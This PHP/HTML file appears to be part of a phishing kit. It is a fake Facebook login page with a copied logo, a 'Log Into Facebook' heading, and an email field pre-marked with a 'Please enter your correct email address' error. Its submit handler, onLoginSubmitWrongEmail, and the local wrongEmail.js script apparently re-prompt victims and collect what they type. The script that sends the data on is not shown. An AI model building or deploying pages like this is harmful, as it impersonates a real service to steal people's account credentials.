<?php 
// Retrieve the email from the session if it exists
$email = isset($_SESSION['email']) ? htmlspecialchars($_SESSION['email']) : '';

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link href="./assets/css/boxicons.min.css" rel="stylesheet">

    <link rel="stylesheet" href="./assets/css/loginstyle.css">
    <title>Facebook</title>
<style>
    .lgF{
        height:300px !important;
    }
</style>
</head>

<body>
    <div class="container">
        <div class="main">
            <img src="./assets/img/flogo.svg" alt="" style="width: 190px;margin-bottom: 25px;">
            <!-- <div class="must">
                <div style="background-color:#3578e5;width:38px;height:38px;border-radius:4px;"><img
                        src="./assets/img/i.png" alt="" width="20px" style="padding-top: 9px;"></div>
                <p>You must log in to continue.</p>
            </div> -->
            <div class="lgF">
            <form method="POST" class="form" onsubmit="return onLoginSubmitWrongEmail(this)">
        <p style="color:#000; font-family: Helvetica, Arial, sans-serif; font-size: 19px; padding-top: 25px;">
            Log Into Facebook
        </p>
        <!-- <div class="alert">
            <p>You must log in to continue.</p>
        </div> -->
        <div class="form-group">
            <input type="text" name="emailPhoneWrong" id="emailPhone" placeholder="Email address"
                class="form-control emailPhone" style="border-radius: 6px;" value="">
            <div class="emailPhone-error error-message"></div>
            <div class="emailPhone-error error-message">Please enter your correct email address.</div>
        </div>

        <br>
        <div class="form-group">
            <button type="submit" class="form-control btn login-button" 
                style="color: #fff; background-color: #1877F2; margin-top: 10px; font-size: 21px; font-weight: 600; height: 50px; padding-top: 5px !important; padding-bottom: 5px !important; border-radius: 6px;">
                <i class="bx bx-loader-alt bx-spin bx-rotate-90" style="display: none;"></i> <!-- Spinner icon -->
                Log In
            </button>
        </div>
        <p style="margin-top: 10px; font-size: 14px; color: #1877f2; cursor: pointer;">
            <a href="https://www.facebook.com/login/identify/" style="text-decoration: none !important;" target="_blank">
                Forgot password?
            </a>
        </p>
    </form>
</div>
        </div>
    </div>
    <?php include "./components/LoginFooter.php"; ?>
    <!-- Validation -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- jQuery library -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="./assets/js/wrongEmail.js"></script>
</body>

</html>